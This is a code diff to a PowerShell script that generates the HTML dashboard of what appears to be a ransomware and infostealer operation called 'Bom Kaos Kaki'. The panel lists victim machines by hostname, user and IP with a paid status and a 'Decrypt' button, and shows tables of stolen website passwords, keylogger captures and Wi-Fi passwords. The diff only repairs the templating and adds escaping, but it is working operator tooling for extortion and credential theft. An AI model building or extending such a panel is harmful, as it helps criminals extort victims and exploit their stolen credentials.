@@ -1,3 +1,7 @@
+$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("deploy\public\kaoskaki.webp"))
+$b64Img = "data:image/webp;base64,$b64"
+
+$html = @"
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -101,7 +105,7 @@
         <!-- Sidebar -->
         <div class="sidebar">
             <div class="logo-container">
-                <img src="$b64Img" alt="Logo">
+                <img src="`$b64Img" alt="Logo">
                 <h1>Bom Kaos Kaki</h1>
             </div>
             <div class="nav-menu">
@@ -283,33 +287,33 @@
                 const sBody = document.getElementById('sessionsBody');
                 sBody.innerHTML = (data.sessions || []).map(s => {
                     const status = s.is_paid ? '<span class="badge badge-paid">Paid</span>' : '<span class="badge badge-active">Active</span>';
-                    return <tr>
-        <td><code>\</code></td>
-        <td>\<br><span style="color:#888;font-size:11px">\</span></td>
-        <td>\</td>
-        <td>\</td>
-        <td><button onclick="markPaid('\')" class="action-btn">Decrypt</button></td>
-      </tr>;
+                    return `<tr>
+        <td><code>\${escapeHTML(s.id?.substring(0, 8) || '?')}</code></td>
+        <td>\${escapeHTML(s.hostname || '?')}<br><span style="color:#888;font-size:11px">\${escapeHTML(s.username || '?')}</span></td>
+        <td>\${escapeHTML(s.ip || '?')}</td>
+        <td>\${status}</td>
+        <td><button onclick="markPaid('\${escapeHTML(s.id || '')}')" class="action-btn">Decrypt</button></td>
+      </tr>`;
                 }).join('');
 
                 const cBody = document.getElementById('credsBody');
                 cBody.innerHTML = (data.credentials || []).map(c => {
                     const cred = c.data || {};
-                    return <tr>
-        <td>\</td>
-        <td>\</td>
-        <td><code>\</code></td>
-      </tr>;
+                    return `<tr>
+        <td>\${escapeHTML(cred.url || cred.origin || '?')}</td>
+        <td>\${escapeHTML(cred.username || cred.email || '?')}</td>
+        <td><code>\${escapeHTML(cred.password || '?')}</code></td>
+      </tr>`;
                 }).join('');
 
                 const kBody = document.getElementById('keylogBody');
                 kBody.innerHTML = (data.keylogs || []).map(k => {
                     const ts = k.timestamp?._seconds ? new Date(k.timestamp._seconds * 1000).toLocaleString() : '';
-                    return <tr>
-        <td><code>\</code></td>
-        <td>\...</td>
-        <td><span style="color:#888;font-size:11px">\</span></td>
-      </tr>;
+                    return `<tr>
+        <td><code>\${escapeHTML(k.session_id?.substring(0, 8) || '?')}</code></td>
+        <td>\${escapeHTML((k.data?.content || k.data || '').substring(0, 60))}...</td>
+        <td><span style="color:#888;font-size:11px">\${escapeHTML(ts)}</span></td>
+      </tr>`;
                 }).join('');
 
                 const wBody = document.getElementById('wifiBody');
@@ -318,11 +322,11 @@
                     const wifiData = w.data || {};
                     const ssid = Array.isArray(wifiData) ? wifiData.map(x => x.ssid).join(', ') : wifiData.ssid || '?';
                     const pass = Array.isArray(wifiData) ? wifiData.map(x => x.password).join(', ') : wifiData.password || '?';
-                    return <tr>
-        <td>\</td>
-        <td><code>\</code></td>
-        <td><span style="color:#888;font-size:11px">\</span></td>
-      </tr>;
+                    return `<tr>
+        <td>\${escapeHTML(ssid)}</td>
+        <td><code>\${escapeHTML(pass)}</code></td>
+        <td><span style="color:#888;font-size:11px">\${escapeHTML(ts)}</span></td>
+      </tr>`;
                 }).join('');
 
                 btn.textContent = 'Refresh Data';
@@ -358,3 +362,6 @@
     </script>
 </body>
 </html>
+"@
+
+Set-Content -Path "c:\Users\Yudha\Downloads\Bom-KaosKaki\deploy\api\dashboard.html" -Value $html
